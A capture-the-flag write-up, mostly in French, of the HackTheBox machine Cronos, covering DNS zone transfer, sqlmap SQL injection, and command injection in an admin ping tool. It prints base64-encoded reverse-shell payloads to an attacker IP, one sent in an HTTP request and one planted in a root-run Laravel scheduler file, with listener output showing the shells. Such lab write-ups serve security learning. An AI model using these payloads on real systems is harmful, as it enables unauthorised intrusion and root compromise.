---
title: HTB | Cronos
description: CronOS focuses mainly on different vectors for enumeration and also emphasises the risks associated with adding world-writable files to the root crontab. This machine also includes an introductory-level SQL injection vulnerability.
slug: cronos-htb
date: 2025-07-11 00:00:00+0000
#image: cover.png
categories:
 - HackTheBox
tags:
 - Linux
 - Medium
#weight: 1
---

<table style="border:none; width:100%;">
  <tr>
    <!-- Colonne gauche : logo -->
    <td style="border:none; text-align:center; vertical-align:middle; width:150px;">
      <img src="cover.png" alt="Cronos cover" width="120">
    </td>
    <td style="border:none; text-align:center; vertical-align:middle;">
      <table style="margin:auto; border-collapse:collapse; border:1px solid #ddd;">
        <thead>
          <tr>
            <th style="padding:8px; border:1px solid #ddd; text-align:center;">Machine name</th>
            <th style="padding:8px; border:1px solid #ddd; text-align:center;">OS</th>
            <th style="padding:8px; border:1px solid #ddd; text-align:center;">IP</th>
            <th style="padding:8px; border:1px solid #ddd; text-align:center;">Difficulty</th>
          </tr>
        </thead>
        <tbody>
          <tr>
            <td style="padding:8px; border:1px solid #ddd; text-align:center;">Cronos</td>
            <td style="padding:8px; border:1px solid #ddd; text-align:center;">Linux</td>
            <td style="padding:8px; border:1px solid #ddd; text-align:center;">10.10.10.13</td>
            <td style="padding:8px; border:1px solid #ddd; text-align:center;">Medium</td>
          </tr>
        </tbody>
      </table>
    </td>
  </tr>
</table>

## Enumeration

### nmap
```bash
$ nmap -sC -sV -p- -An -vvv 10.10.10.13            

PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 18b973826f26c7788f1b3988d802cee8 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCkOUbDfxsLPWvII72vC7hU4sfLkKVEqyHRpvPWV2+5s2S4kH0rS25C/R+pyGIKHF9LGWTqTChmTbcRJLZE4cJCCOEoIyoeXUZWMYJCqV8crflHiVG7Zx3wdUJ4yb54G6NlS4CQFwChHEH9xHlqsJhkpkYEnmKc+CvMzCbn6CZn9KayOuHPy5NEqTRIHObjIEhbrz2ho8+bKP43fJpWFEx0bAzFFGzU0fMEt8Mj5j71JEpSws4GEgMycq4lQMuw8g6Acf4AqvGC5zqpf2VRID0BDi3gdD1vvX2d67QzHJTPA5wgCk/KzoIAovEwGqjIvWnTzXLL8TilZI6/PV8wPHzn
|   256 1ae606a6050bbb4192b028bf7fe5963b (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBKWsTNMJT9n5sJr5U1iP8dcbkBrDMs4yp7RRAvuu10E6FmORRY/qrokZVNagS1SA9mC6eaxkgW6NBgBEggm3kfQ=
|   256 1a0ee7ba00cc020104cda3a93f5e2220 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHBIQsAL/XR/HGmUzGZgRJe/1lQvrFWnODXvxQ1Dc+Zx
53/tcp open  domain  syn-ack ttl 63 ISC BIND 9.10.3-P4 (Ubuntu Linux)
| dns-nsid: 
|_  bind.version: 9.10.3-P4-Ubuntu
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.18 ((Ubuntu))
| http-methods: 
|_  Supported Methods: POST OPTIONS GET HEAD
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.18 (Ubuntu)
```

## Foothold

### dig
```bash
## dig axfr @10.10.10.13 cronos.htb

; <<>> DiG 9.18.33-1~deb12u2-Debian <<>> axfr @10.10.10.13 cronos.htb
; (1 server found)
;; global options: +cmd
cronos.htb.		604800	IN	SOA	cronos.htb. admin.cronos.htb. 3 604800 86400 2419200 604800
cronos.htb.		604800	IN	NS	ns1.cronos.htb.
cronos.htb.		604800	IN	A	10.10.10.13
admin.cronos.htb.	604800	IN	A	10.10.10.13
ns1.cronos.htb.		604800	IN	A	10.10.10.13
www.cronos.htb.		604800	IN	A	10.10.10.13
cronos.htb.		604800	IN	SOA	cronos.htb. admin.cronos.htb. 3 604800 86400 2419200 604800
;; Query time: 20 msec
;; SERVER: 10.10.10.13#53(10.10.10.13) (TCP)
;; WHEN: Thu Jul 10 22:16:46 CEST 2025
;; XFR size: 7 records (messages 1, bytes 203)
```

### admin.cronos.htb login page

### sqlmap
```bash
sqlmap --forms --batch -u "http://admin.cronos.htb/"
> username field is vulnerable to blind SQL Injection !

sqlmap --forms --batch -u "http://admin.cronos.htb/" --current-db
> admin

sqlmap --forms --batch -u "http://admin.cronos.htb/" -D admin --tables
> users

sqlmap --forms --batch -u "http://admin.cronos.htb/" -D admin -T users --columns
> Too slow... Trying to guess "password" field and it works !

sqlmap --forms --batch -u "http://admin.cronos.htb/" -D admin -T users -C password --dump
> 4f5fffa7b2340178a716e3832451e058
```
Sur crackstation : Not found.
Hashcat avec rockyou.txt : Not found.

J'ai cherché le hachage sur google : "4f5fffa7b2340178a716e3832451e058"
Bingo ! On trouve le mot de passe : 1327663704

On essaye les credentials sur la page de login de admin.cronos.htb et ça marche :
- user: admin
- pass: 1327663704

Après review du code source  (plus tard) on découvre que :
$myusername = $_POST['username'];
$mypassword = md5($_POST['password']); 

### Command Injection - admin dashboard
On peut faire des ping et des traceroute sur la page d'admin. En utilisant burp on peut modifier la commande pour executer ce qu'on veut. On peut alors executer un reverse shell vers notre machine :
```bash
POST /welcome.php HTTP/1.1
Host: admin.cronos.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 16
Origin: http://admin.cronos.htb
Connection: keep-alive
Referer: http://admin.cronos.htb/welcome.php
Cookie: PHPSESSID=0p5lct2jjmbq5neupststnl996
Upgrade-Insecure-Requests: 1
Priority: u=0, i

command=echo+c2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuMjUvOTAwMSAwPiYx+|+base64+-d+|+bash&host=z

------------------------

$ nc -lnvp 9001
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::9001
Ncat: Listening on 0.0.0.0:9001
Ncat: Connection from 10.10.10.13.
Ncat: Connection from 10.10.10.13:55658.
sh: 0: can't access tty; job control turned off
$ whoami
www-data
$ export TERM=xterm
$ python3 -V
Python 3.5.2
$ python3 -c 'import pty;pty.spawn("/bin/bash")'
www-data@cronos:/var/www/admin$ ^Z
[2]  + 27640 suspended  nc -lnvp 9001                                                                                  
[Jul 10, 2025 - 23:33:12 (CEST)] exegol-pentest Cronos # stty raw -echo;fg
[2]  - 27640 continued  nc -lnvp 9001

www-data@cronos:/var/www/admin$ whoami
www-data
www-data@cronos:/var/www/admin$ cd /home
www-data@cronos:/home$ cd noulis/
www-data@cronos:/home/noulis$ cat user.txt 
fe30.....e498
```

## www-data -> root

### laravel root crontab
En utilisant linpeas, on s'en compte que l'utilisateur **root** execute chaque minute :
> php /var/www/laravel/artisan schedule:run >> /dev/null 2>&1

```bash
╔══════════╣ Check for vulnerable cron jobs
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#scheduledcron-jobs
══╣ Cron jobs list

...

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
* * * * *	root	php /var/www/laravel/artisan schedule:run >> /dev/null 2>&1
```
Grâce à ChatGPT, on comprend qu'il faut modifier le fichier **/var/www/laravel/app/Console/Kernel.php**. La fonction schedule de ce fichier est executé toutes les minutes par root. Il suffit donc d'executer une commande de reverse shell et le tour est joué.
```bash
www-data@cronos:/var/www/laravel/app/Console$ head Kernel.php -n100
<?php

namespace App\Console;

use Illuminate\Console\Scheduling\Schedule;
use Illuminate\Foundation\Console\Kernel as ConsoleKernel;

class Kernel extends ConsoleKernel
{
    /**
     * The Artisan commands provided by your application.
     *
     * @var array
     */
    protected $commands = [
        //
    ];

    /**
     * Define the application's command schedule.
     *
     * @param  \Illuminate\Console\Scheduling\Schedule  $schedule
     * @return void
     */
    protected function schedule(Schedule $schedule)
    {
        $schedule->exec('echo c2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuMjUvOTAwMiAwPiYx | base64 -d | bash')->everyMinute();
        // $schedule->command('inspire')
        //          ->hourly();
    }

    /**
     * Register the Closure based commands for the application.
     *
     * @return void
     */
    protected function commands()
    {
        require base_path('routes/console.php');
    }
}
```
Au bout d'une minute, on reçoit bien un shell en tant que root.
```bash
## nc -lnvp 9002                        
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::9002
Ncat: Listening on 0.0.0.0:9002
Ncat: Connection from 10.10.10.13.
Ncat: Connection from 10.10.10.13:38926.
sh: 0: can't access tty; job control turned off
# whoami
root
# cat /root/root.txt	
3c1c.....64e8
```

## Tips
- Toujours faire un **sqlmap** sur une page de login si on ne trouve rien ! Tester un "' or 1=1; --" n'est pas suffisant. Il y a bcp de sql injection que l'on peut decouvrir avec SQLMAP...